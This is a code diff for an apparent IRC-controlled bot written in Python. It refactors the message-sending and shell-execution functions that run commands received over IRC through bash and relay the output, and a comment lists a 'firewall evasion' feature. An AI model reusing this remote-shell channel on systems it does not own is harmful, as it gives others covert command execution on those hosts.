@@ -31,7 +31,7 @@ import skype
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 
-version = "3.8"                                                   # bot version
+version = "4.0"                                                   # bot version
 
 ### Remove/comment this block to disable logging stdout/err to a file
 so = se = open("bot_v%s.log" % version, 'w', 0)
@@ -162,8 +162,10 @@ def privmsg(msg=None, to=admin):                                  # function to 
         msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
     elif type(msg) is not str or unicode:
         msg = str(msg).strip()
-    log('[+] Sent Data:')
-    if (len(msg) > 480) or (msg.find('\n') != -1):
+    if len(msg) < 1:
+        pass
+    elif (len(msg) > 480) or (msg.find('\n') != -1):
+        log('[+] Sent Data:')
         log('[#] Starting multiline output.')
         msgs = line_split(msg, 480)                               # use line_split to split output into multiple lines based on max message length (480)
         total = len(msgs)
@@ -171,24 +173,22 @@ def privmsg(msg=None, to=admin):                                  # function to 
             signal.signal(signal.SIGALRM, timeout_handler)
             signal.alarm(1)                                          # doubles as flood prevention and input checking
             try:
-                data = irc.recv ( 4096 )
-                if (data.find('!stop') != -1):
-                    signal.alarm(0)
-                    log('[+] Recieved:')
-                    log('[>]    ', data.strip())
-                    retcode = "Stopped Output."
-                    privmsg("[X]: %s" % retcode, to)
-                    break
+                data = irc.recv(4096)
             except:
+                data = ""
                 pass
+            signal.alarm(0)
+            if (data.find('!stop') != -1):
+                log('[+] Recieved:')
+                log('[>]    ', data.strip())
+                retcode = "Stopped buffered multiline output."
+                privmsg("[X]: %s" % retcode, to)
+                break
             log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
             irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))      # [1/10] Output line 1 out of 10 total
-            signal.alarm(0)
-
-        log('[#] Finished multiline output.')  
-    elif len(msg) < 1:
-        pass
+        log('[#] Finished multiline output.')     
     else:
+        log('[+] Sent Data:')
         log('[<]    PRIVMSG %s :%s\r' % (to, msg))
         irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))
 
@@ -198,57 +198,59 @@ def broadcast(msg):                                               # function to 
 ############ Keyword functions
 
 def run_shell(cmd, timeout=60, verbose=False):                    # run a shell command and return the output, verbose enables live command output via yield
-    out = ''
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(timeout)
     try:
         p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
         log("[$]   Started.")
-        continue_running = 1
+        continue_running = True
     except Exception as e:
         yield("Failed: %s" % e)
-        out += "Failed: %s" % e
-        continue_running = 0
+        continue_running = False
     signal.alarm(0)
-    while(continue_running):
+    while continue_running:
         signal.signal(signal.SIGALRM, timeout_handler)
         signal.alarm(1)
         try:
             line = p.stdout.readline()
             if verbose: yield(line)
             else: yield(line.strip())
-            out += line
         except:
             pass
+        signal.alarm(0)
         signal.signal(signal.SIGALRM, timeout_handler)
         signal.alarm(1)
         try:
             log('[#] Checking for input.')
-            data = irc.recv ( 4096 )
-            if (data.find('!cancel') != -1):
-                signal.alarm(0)
-                log('[+] Recieved:')
-                log('[>]    ', data.strip())
-                continue_running = False
-                retcode = "Cancelled."
-                yield("[X]: %s" % retcode)
-                os.killpg(p.pid, signal.SIGTERM)
-                break
-            else:
-                retcode = p.poll() #returns None while subprocess is running
+            data = irc.recv(4096)
         except Exception as e:
-            retcode = p.poll() #returns None while subprocess is running
+            data = ""
+            retcode = p.poll()  #returns None while subprocess is running
         signal.alarm(0)
-        if (retcode is not None):
-            line = p.stdout.read()
-            if verbose: yield(line)
-            out += line
-            out += "[$] Exit Status: %s" % retcode
-            if (retcode != 0):
+
+        if (data.find('!cancel') != -1):
+            log('[+] Recieved:')
+            log('[>]    ', data.strip())
+            retcode = "Cancelled live output reading. You have to kill the process manually."
+            yield("[X]: %s" % retcode)
+            continue_running = False
+            break
+
+        elif retcode is not None:
+            signal.signal(signal.SIGALRM, timeout_handler)
+            signal.alarm(1)
+            try:
+                line = p.stdout.read()
+            except:
+                retcode = "Too much output, read timed out. Process is still running in background."
+            signal.alarm(0)
+            if verbose and len(line) > 0: 
+                yield(line)
+            if retcode != 0:
                 yield("[X]: %s" % retcode)
-            elif (retcode == 0) and verbose:
+            elif retcode == 0 and verbose:
                 yield("[√]")
-            continue_running = 0
+            continue_running = False
             break
 
 def run_python(cmd):                                              # interactively interprets recieved python code
